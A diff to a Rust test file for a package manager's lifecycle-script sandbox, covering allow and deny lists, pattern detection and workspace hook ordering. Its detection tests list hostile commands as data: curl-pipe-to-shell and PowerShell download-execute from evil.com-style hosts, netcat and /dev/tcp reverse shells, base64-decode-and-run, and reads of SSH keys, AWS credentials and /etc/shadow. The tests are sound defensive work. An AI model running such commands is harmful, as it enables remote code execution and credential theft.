@@ -1,4 +1,4 @@
-use crate::*;
+﻿use crate::*;
 use std::collections::{HashMap, VecDeque};
 use std::path::PathBuf;
 
@@ -86,6 +86,7 @@ async fn test_optional_lifecycle_script_failure_isolation() {
         ignore_scripts: false,
         capture_output: true,
         timeout: None,
+        sandbox_policy: ScriptSandboxPolicy::default(),
     };
 
     // When optional is true, script failure is isolated and does NOT fail execution
@@ -277,6 +278,7 @@ async fn test_topological_dependency_cycle_prevention() {
         ignore_scripts: false,
         capture_output: true,
         timeout: None,
+        sandbox_policy: ScriptSandboxPolicy::default(),
     };
 
     // Cyclic dependency should NOT overflow the stack and should successfully execute
@@ -317,6 +319,7 @@ async fn test_optional_dependency_disk_removal_on_failure() {
         ignore_scripts: false,
         capture_output: true,
         timeout: None,
+        sandbox_policy: ScriptSandboxPolicy::default(),
     };
 
     let res = execute_topological(&[node], &root_manifest, &opts).await;
@@ -792,6 +795,7 @@ async fn test_lifecycle_topological_stress_50_plus_packages() {
         ignore_scripts: false,
         capture_output: true,
         timeout: None,
+        sandbox_policy: ScriptSandboxPolicy::default(),
     };
 
     let res = execute_topological(&nodes, &root_manifest, &opts).await;
@@ -1433,4 +1437,600 @@ process.exitCode = 0;
     assert!(out.stderr.contains("_authToken=[REDACTED]") || out.stderr.contains("_authtoken=[REDACTED]"));
 }
 
+#[test]
+fn test_sandbox_policy_disabled_level() {
+    let policy = ScriptSandboxPolicy::disabled();
+    assert_eq!(policy.level, SandboxLevel::Disabled);
 
+    let err = policy.check_execution_allowed("any-pkg", "echo 1").unwrap_err();
+    assert!(matches!(err, LifecycleError::ScriptsDisabled));
+}
+
+#[tokio::test]
+async fn test_sandbox_policy_disabled_topological_skips() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let mut manifest = Manifest::default();
+    manifest.name = Some("disabled-pkg".to_string());
+    // If executed, this would fail or write a file, but disabled skips entirely
+    manifest.scripts.insert("postinstall".to_string(), "node -e \"process.exit(1)\"".to_string());
+
+    let node = LifecyclePackageNode {
+        package_path: "node_modules/disabled-pkg".to_string(),
+        disk_path: root.join("node_modules").join("disabled-pkg"),
+        manifest,
+        source: PackageSource::Registry,
+        dependencies: vec![],
+        optional: false,
+    };
+
+    let root_manifest = Manifest::default();
+    let opts = LifecycleOptions::new(root)
+        .with_sandbox_policy(ScriptSandboxPolicy::disabled());
+
+    let res = execute_topological(&[node], &root_manifest, &opts).await;
+    assert!(res.is_ok(), "Disabled sandbox policy must skip topological script execution");
+}
+
+#[test]
+fn test_sandbox_policy_denylist_enforcement() {
+    let policy = ScriptSandboxPolicy::default().deny_package("malicious-crypto-miner");
+    assert!(policy.denylist.contains("malicious-crypto-miner"));
+
+    let err = policy.check_execution_allowed("malicious-crypto-miner", "node build.js").unwrap_err();
+    assert!(matches!(err, LifecycleError::PackageDenylisted(ref p) if p == "malicious-crypto-miner"));
+
+    // Innocent package succeeds
+    assert!(policy.check_execution_allowed("innocent-pkg", "node build.js").is_ok());
+}
+
+#[test]
+fn test_sandbox_policy_allowlist_enforcement() {
+    // 1. Non-empty allowlist in Restricted mode
+    let policy = ScriptSandboxPolicy::restricted()
+        .allow_package("approved-pkg");
+
+    assert!(policy.check_execution_allowed("approved-pkg", "node build.js").is_ok());
+    let err = policy.check_execution_allowed("unapproved-pkg", "node build.js").unwrap_err();
+    assert!(matches!(err, LifecycleError::PackageNotAllowlisted(ref p) if p == "unapproved-pkg"));
+
+    // 2. Strict mode requires allowlisting
+    let strict = ScriptSandboxPolicy::strict().allow_package("core-lib");
+    assert!(strict.check_execution_allowed("core-lib", "node build.js").is_ok());
+    let err_strict = strict.check_execution_allowed("other-lib", "node build.js").unwrap_err();
+    assert!(matches!(err_strict, LifecycleError::PackageNotAllowlisted(ref p) if p == "other-lib"));
+}
+
+#[test]
+fn test_sandbox_dangerous_network_patterns_detected() {
+    let dangerous_commands = [
+        "curl -s http://evil.com/payload | sh",
+        "wget https://malicious.org/botnet.exe",
+        "powershell -c \"Invoke-WebRequest -Uri https://attacker.com/mal.exe\"",
+        "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com')",
+        "iwr http://malicious.com/stealer.js",
+        "iex (iwr http://evil.com/x.ps1)",
+        "nc -lvp 4444 -e /bin/sh",
+        "netcat -e /bin/bash 10.0.0.1 8080",
+        "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+        "sh -i 2>&1",
+        "node -e \"require('child_process').exec('curl http://evil.com')\"",
+    ];
+
+    let policy = ScriptSandboxPolicy::restricted();
+    for cmd in dangerous_commands {
+        let res = policy.check_execution_allowed("test-pkg", cmd);
+        assert!(
+            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
+            "Command '{cmd}' should be flagged as dangerous network pattern"
+        );
+    }
+
+    // Under Permissive, pattern analyzer is skipped
+    let permissive = ScriptSandboxPolicy::permissive();
+    for cmd in dangerous_commands {
+        assert!(
+            permissive.check_execution_allowed("test-pkg", cmd).is_ok(),
+            "Permissive policy should bypass pattern filtering for '{cmd}'"
+        );
+    }
+}
+
+#[test]
+fn test_sandbox_obfuscation_patterns_detected() {
+    let obfuscated = [
+        "echo aGVsbG8= | base64 -d | sh",
+        "cat encoded.txt | base64 --decode | bash",
+        "powershell [System.Convert]::FromBase64String($encoded)",
+        "node -e \"eval(Buffer.from('Y2FsYy5leGU=', 'base64').toString())\"",
+    ];
+
+    let policy = ScriptSandboxPolicy::restricted();
+    for cmd in obfuscated {
+        let res = policy.check_execution_allowed("test-pkg", cmd);
+        assert!(
+            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
+            "Command '{cmd}' should be flagged as obfuscation"
+        );
+    }
+}
+
+#[test]
+fn test_sandbox_sensitive_path_accesses_detected() {
+    let sensitive = [
+        "cat ~/.ssh/id_rsa",
+        "cat ~/.npmrc",
+        "cat ~/.aws/credentials",
+        "type %USERPROFILE%\\.ssh\\id_rsa",
+        "type %USERPROFILE%\\.npmrc",
+        "type %USERPROFILE%\\.aws\\config",
+        "cat /etc/passwd",
+        "cat /etc/shadow",
+        "cat $HOME/.ssh/authorized_keys",
+        "cat ${HOME}/.aws/config",
+        "cat $HOME/.npmrc",
+    ];
+
+    let policy = ScriptSandboxPolicy::restricted();
+    for cmd in sensitive {
+        let res = policy.check_execution_allowed("test-pkg", cmd);
+        assert!(
+            matches!(res, Err(LifecycleError::DangerousCommandPattern { .. })),
+            "Command '{cmd}' should be flagged as sensitive path access"
+        );
+    }
+}
+
+#[test]
+fn test_sandbox_execution_cancellation_sync() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let ctx = LifecycleContext::new(
+        root,
+        root,
+        "malicious-curl-pkg",
+        "postinstall",
+        "curl http://evil.com/payload.sh",
+    );
+
+    // Must immediately fail and cancel execution before spawning process
+    let res = execute_lifecycle_script(&ctx);
+    assert!(res.is_err(), "Dangerous script must fail synchronously before spawn");
+    let err_str = res.unwrap_err().to_string();
+    assert!(err_str.contains("Dangerous command pattern detected"));
+    assert!(err_str.contains("curl"));
+}
+
+#[tokio::test]
+async fn test_sandbox_execution_cancellation_async() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let ctx = LifecycleContext::new(
+        root,
+        root,
+        "malicious-ssh-pkg",
+        "preinstall",
+        "cat ~/.ssh/id_rsa",
+    );
+
+    // Must immediately fail and cancel async execution
+    let res = execute_lifecycle_script_async(&ctx).await;
+    assert!(res.is_err(), "Dangerous script must fail asynchronously before spawn");
+    let err_str = res.unwrap_err().to_string();
+    assert!(err_str.contains("Dangerous command pattern detected"));
+    assert!(err_str.contains("~/.ssh"));
+}
+
+#[test]
+fn test_sandbox_job_object_process_limits_initialization() {
+    let guard_default = process_guard::ProcessTreeGuard::new();
+    assert!(guard_default.is_some());
+
+    let guard_limited = process_guard::ProcessTreeGuard::new_with_limits(Some(8));
+    assert!(guard_limited.is_some());
+}
+
+#[tokio::test]
+async fn test_workspace_script_hook_sequencing_pre_main_post() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("hook_order.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let pkg_a_dir = root.join("packages").join("pkg-a");
+    let pkg_b_dir = root.join("packages").join("pkg-b");
+    std::fs::create_dir_all(&pkg_a_dir).unwrap();
+    std::fs::create_dir_all(&pkg_b_dir).unwrap();
+
+    let mut manifest_a = Manifest::default();
+    manifest_a.name = Some("pkg-a".to_string());
+    manifest_a.version = Some("1.0.0".to_string());
+    manifest_a.scripts.insert(
+        "prebuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:prebuild\\n')\""),
+    );
+    manifest_a.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:build\\n')\""),
+    );
+    manifest_a.scripts.insert(
+        "postbuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-a:postbuild\\n')\""),
+    );
+
+    let mut manifest_b = Manifest::default();
+    manifest_b.name = Some("pkg-b".to_string());
+    manifest_b.version = Some("1.0.0".to_string());
+    manifest_b.dependencies.insert("pkg-a".to_string(), "1.0.0".to_string());
+    manifest_b.scripts.insert(
+        "prebuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:prebuild\\n')\""),
+    );
+    manifest_b.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:build\\n')\""),
+    );
+    manifest_b.scripts.insert(
+        "postbuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-b:postbuild\\n')\""),
+    );
+
+    let members = vec![
+        WorkspaceScriptMember {
+            name: "pkg-b".to_string(),
+            path: pkg_b_dir,
+            manifest: manifest_b,
+        },
+        WorkspaceScriptMember {
+            name: "pkg-a".to_string(),
+            path: pkg_a_dir,
+            manifest: manifest_a,
+        },
+    ];
+
+    let opts = WorkspaceRunOptions {
+        script: "build".to_string(),
+        args: vec![],
+        ignore_scripts: false,
+        if_present: false,
+        filter_members: None,
+    };
+
+    let summary = execute_workspace_scripts_topological(root, &members, &[], &opts)
+        .await
+        .expect("Workspace build execution must succeed");
+
+    assert_eq!(summary.executed_packages, vec!["pkg-a", "pkg-b"]);
+
+    let content = std::fs::read_to_string(&marker_file).unwrap();
+    let lines: Vec<&str> = content.lines().collect();
+    assert_eq!(
+        lines,
+        vec![
+            "pkg-a:prebuild",
+            "pkg-a:build",
+            "pkg-a:postbuild",
+            "pkg-b:prebuild",
+            "pkg-b:build",
+            "pkg-b:postbuild",
+        ]
+    );
+}
+
+#[tokio::test]
+async fn test_workspace_script_pre_hook_failure_halts_execution() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("pre_fail_marker.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let pkg_1_dir = root.join("packages").join("pkg-1");
+    let pkg_2_dir = root.join("packages").join("pkg-2");
+    std::fs::create_dir_all(&pkg_1_dir).unwrap();
+    std::fs::create_dir_all(&pkg_2_dir).unwrap();
+
+    let mut manifest_1 = Manifest::default();
+    manifest_1.name = Some("pkg-1".to_string());
+    manifest_1.version = Some("1.0.0".to_string());
+    manifest_1.scripts.insert("pretest".to_string(), "node -e \"process.exit(42)\"".to_string());
+    manifest_1.scripts.insert(
+        "test".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:test\\n')\""),
+    );
+    manifest_1.scripts.insert(
+        "posttest".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-1:posttest\\n')\""),
+    );
+
+    let mut manifest_2 = Manifest::default();
+    manifest_2.name = Some("pkg-2".to_string());
+    manifest_2.version = Some("1.0.0".to_string());
+    manifest_2.scripts.insert(
+        "test".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-2:test\\n')\""),
+    );
+
+    let members = vec![
+        WorkspaceScriptMember {
+            name: "pkg-1".to_string(),
+            path: pkg_1_dir,
+            manifest: manifest_1,
+        },
+        WorkspaceScriptMember {
+            name: "pkg-2".to_string(),
+            path: pkg_2_dir,
+            manifest: manifest_2,
+        },
+    ];
+
+    let opts = WorkspaceRunOptions {
+        script: "test".to_string(),
+        args: vec![],
+        ignore_scripts: false,
+        if_present: false,
+        filter_members: None,
+    };
+
+    let res = execute_workspace_scripts_topological(root, &members, &["pkg-1".to_string(), "pkg-2".to_string()], &opts).await;
+    assert!(res.is_err(), "Execution must fail when pre-hook fails");
+
+    let err = res.unwrap_err();
+    let exit_code = extract_error_exit_code(&err);
+    assert_eq!(exit_code, 42, "Exit code must match the failed pre-hook");
+
+    assert!(!marker_file.exists(), "No downstream scripts should have executed after pre-hook failure");
+}
+
+#[tokio::test]
+async fn test_workspace_script_main_failure_prevents_post_hook() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("main_fail_marker.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let pkg_dir = root.join("packages").join("pkg-main-fail");
+    std::fs::create_dir_all(&pkg_dir).unwrap();
+
+    let mut manifest = Manifest::default();
+    manifest.name = Some("pkg-main-fail".to_string());
+    manifest.version = Some("1.0.0".to_string());
+    manifest.scripts.insert(
+        "prebuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'prebuild\\n')\""),
+    );
+    manifest.scripts.insert("build".to_string(), "node -e \"process.exit(17)\"".to_string());
+    manifest.scripts.insert(
+        "postbuild".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'postbuild\\n')\""),
+    );
+
+    let members = vec![WorkspaceScriptMember {
+        name: "pkg-main-fail".to_string(),
+        path: pkg_dir,
+        manifest,
+    }];
+
+    let opts = WorkspaceRunOptions {
+        script: "build".to_string(),
+        args: vec![],
+        ignore_scripts: false,
+        if_present: false,
+        filter_members: None,
+    };
+
+    let res = execute_workspace_scripts_topological(root, &members, &[], &opts).await;
+    assert!(res.is_err(), "Execution must fail when main script fails");
+
+    let err = res.unwrap_err();
+    let exit_code = extract_error_exit_code(&err);
+    assert_eq!(exit_code, 17, "Exit code must match the failed main script");
+
+    let content = std::fs::read_to_string(&marker_file).unwrap();
+    let lines: Vec<&str> = content.lines().collect();
+    assert_eq!(lines, vec!["prebuild"], "Only prebuild should run before failure; postbuild must be skipped");
+}
+
+#[tokio::test]
+async fn test_workspace_script_missing_hooks_safely_skipped() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("missing_hooks_marker.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let p1_dir = root.join("packages").join("pkg-only-main");
+    std::fs::create_dir_all(&p1_dir).unwrap();
+    let mut m1 = Manifest::default();
+    m1.name = Some("pkg-only-main".to_string());
+    m1.scripts.insert(
+        "compile".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-only-main:compile\\n')\""),
+    );
+
+    let p2_dir = root.join("packages").join("pkg-pre-post");
+    std::fs::create_dir_all(&p2_dir).unwrap();
+    let mut m2 = Manifest::default();
+    m2.name = Some("pkg-pre-post".to_string());
+    m2.scripts.insert(
+        "precompile".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-pre-post:precompile\\n')\""),
+    );
+    m2.scripts.insert(
+        "postcompile".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-pre-post:postcompile\\n')\""),
+    );
+
+    let p3_dir = root.join("packages").join("pkg-only-post");
+    std::fs::create_dir_all(&p3_dir).unwrap();
+    let mut m3 = Manifest::default();
+    m3.name = Some("pkg-only-post".to_string());
+    m3.scripts.insert(
+        "postcompile".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'pkg-only-post:postcompile\\n')\""),
+    );
+
+    let p4_dir = root.join("packages").join("pkg-none");
+    std::fs::create_dir_all(&p4_dir).unwrap();
+    let mut m4 = Manifest::default();
+    m4.name = Some("pkg-none".to_string());
+    m4.scripts.insert("unrelated".to_string(), "echo nothing".to_string());
+
+    let members = vec![
+        WorkspaceScriptMember {
+            name: "pkg-only-main".to_string(),
+            path: p1_dir,
+            manifest: m1,
+        },
+        WorkspaceScriptMember {
+            name: "pkg-pre-post".to_string(),
+            path: p2_dir,
+            manifest: m2,
+        },
+        WorkspaceScriptMember {
+            name: "pkg-only-post".to_string(),
+            path: p3_dir,
+            manifest: m3,
+        },
+        WorkspaceScriptMember {
+            name: "pkg-none".to_string(),
+            path: p4_dir,
+            manifest: m4,
+        },
+    ];
+
+    let order = vec![
+        "pkg-only-main".to_string(),
+        "pkg-pre-post".to_string(),
+        "pkg-only-post".to_string(),
+        "pkg-none".to_string(),
+    ];
+
+    let opts = WorkspaceRunOptions {
+        script: "compile".to_string(),
+        args: vec![],
+        ignore_scripts: false,
+        if_present: true,
+        filter_members: None,
+    };
+
+    let summary = execute_workspace_scripts_topological(root, &members, &order, &opts)
+        .await
+        .expect("Execution must succeed with skipped missing hooks");
+
+    assert_eq!(
+        summary.executed_packages,
+        vec!["pkg-only-main", "pkg-pre-post", "pkg-only-post"]
+    );
+    assert_eq!(summary.skipped_packages, vec!["pkg-none"]);
+
+    let content = std::fs::read_to_string(&marker_file).unwrap();
+    let lines: Vec<&str> = content.lines().collect();
+    assert_eq!(
+        lines,
+        vec![
+            "pkg-only-main:compile",
+            "pkg-pre-post:precompile",
+            "pkg-pre-post:postcompile",
+            "pkg-only-post:postcompile",
+        ]
+    );
+}
+
+#[tokio::test]
+async fn test_workspace_topological_order_execution_dependencies_before_dependents() {
+    let temp = tempfile::tempdir().unwrap();
+    let root = temp.path();
+
+    let marker_file = root.join("topo_dep_order.txt");
+    let escaped_marker = marker_file.to_string_lossy().replace('\\', "/");
+
+    let mut m_core = Manifest::default();
+    m_core.name = Some("core-db".to_string());
+    m_core.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'core-db\\n')\""),
+    );
+
+    let mut m_auth = Manifest::default();
+    m_auth.name = Some("auth-service".to_string());
+    m_auth.dependencies.insert("core-db".to_string(), "workspace:*".to_string());
+    m_auth.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'auth-service\\n')\""),
+    );
+
+    let mut m_gw = Manifest::default();
+    m_gw.name = Some("api-gateway".to_string());
+    m_gw.dependencies.insert("auth-service".to_string(), "workspace:*".to_string());
+    m_gw.dev_dependencies.insert("core-db".to_string(), "workspace:*".to_string());
+    m_gw.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'api-gateway\\n')\""),
+    );
+
+    let mut m_front = Manifest::default();
+    m_front.name = Some("frontend-app".to_string());
+    m_front.dependencies.insert("api-gateway".to_string(), "workspace:*".to_string());
+    m_front.scripts.insert(
+        "build".to_string(),
+        format!("node -e \"require('fs').appendFileSync('{escaped_marker}', 'frontend-app\\n')\""),
+    );
+
+    let members = vec![
+        WorkspaceScriptMember {
+            name: "frontend-app".to_string(),
+            path: root.join("packages/frontend-app"),
+            manifest: m_front,
+        },
+        WorkspaceScriptMember {
+            name: "api-gateway".to_string(),
+            path: root.join("packages/api-gateway"),
+            manifest: m_gw,
+        },
+        WorkspaceScriptMember {
+            name: "auth-service".to_string(),
+            path: root.join("packages/auth-service"),
+            manifest: m_auth,
+        },
+        WorkspaceScriptMember {
+            name: "core-db".to_string(),
+            path: root.join("packages/core-db"),
+            manifest: m_core,
+        },
+    ];
+
+    for m in &members {
+        std::fs::create_dir_all(&m.path).unwrap();
+    }
+
+    let opts = WorkspaceRunOptions {
+        script: "build".to_string(),
+        args: vec![],
+        ignore_scripts: false,
+        if_present: false,
+        filter_members: None,
+    };
+
+    let summary = execute_workspace_scripts_topological(root, &members, &[], &opts)
+        .await
+        .expect("Workspace topological execution must succeed");
+
+    assert_eq!(
+        summary.executed_packages,
+        vec!["core-db", "auth-service", "api-gateway", "frontend-app"]
+    );
+
+    let content = std::fs::read_to_string(&marker_file).unwrap();
+    let lines: Vec<&str> = content.lines().collect();
+    assert_eq!(
+        lines,
+        vec!["core-db", "auth-service", "api-gateway", "frontend-app"],
+        "Dependencies must execute before dependents regardless of initial member order"
+    );
+}
